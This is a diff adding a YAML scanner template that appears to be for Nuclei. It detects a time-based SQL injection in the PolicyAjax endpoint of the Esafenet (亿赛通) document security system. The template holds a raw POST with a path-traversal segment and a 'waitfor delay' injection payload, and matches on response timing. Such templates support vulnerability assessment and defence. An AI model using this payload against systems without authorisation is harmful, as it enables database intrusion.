@@ -1,0 +1,38 @@
+id: poc-yaml-yisaitong-esafenet-olicyajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 PolicyAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 亿赛通电子文档安全管理系统
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=selectOption&id=1';waitfor+delay+'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: size
+        condition: and
+        size:
+          - 0
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
